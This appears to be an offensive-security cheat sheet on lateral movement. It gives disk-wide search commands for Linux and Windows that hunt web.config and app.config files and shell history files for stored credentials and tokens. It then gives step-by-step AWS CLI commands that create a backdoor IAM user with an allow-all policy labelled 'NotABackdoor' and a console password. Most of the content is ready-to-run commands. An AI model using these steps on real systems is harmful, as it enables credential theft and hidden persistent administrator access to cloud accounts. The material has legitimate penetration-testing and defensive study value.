# Lateral movement
## Stealing access tokens
### Web config and App config files
-  ```Web.config``` and ```app.config``` files might contain creds or access tokens.
- Look for management cert and extract to ```.pfx``` like publishsettings files
```
sudo find / -name web.config 2>/dev/null
Get-ChildItem -Path C:\ -Filter app.config -Recurse -ErrorAction SilentlyContinue -Force
```

### Internal repositories
- Find internal repos (scan for port 80, 443 or Query AD and look for subdomains or hostnames as git, code, repo, gitlab, bitbucket etc)
- Tools for finding secrets
  - Gitleaks https://github.com/zricethezav/gitleaks
  - Gitrob https://github.com/michenriksen/gitrob
  - Truffle hog https://github.com/dxa4481/truffleHog
  
### Command history
- Look through command history
- ```~/.bash_history`` or ```%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt```
```
sudo find / -name .bash_history 2>/dev/null
Get-ChildItem -Path C:\ -Filter *ConsoleHost_history.txt* -Recurse -ErrorAction SilentlyContinue -Force
```

## Gain GUI Acess
#### Copy and save the following
- as ```admin-policy.json```
```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "NotABackdoor",
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

#### Create a new user that will give gui access to
- After gaining administrator
- Note down the ARN
```
sudo aws iam create-user --user-name gui-user --profile <profile name>
```

#### Attach the policy to the new user
```
sudo aws iam put-user-policy --user-name gui-user --policy-name VisualAid --policy-document file://admin-policy.json --profile <profile name>
```

#### Set password for the user
```
sudo aws iam create-login-profile --user-name gui-user --password "GUIAccessTime1" --profile <profile name>
```

#### Login with account ID
- Part from ARN
- https://<Account-ID-Number>.signin.aws.amazon.com/console/
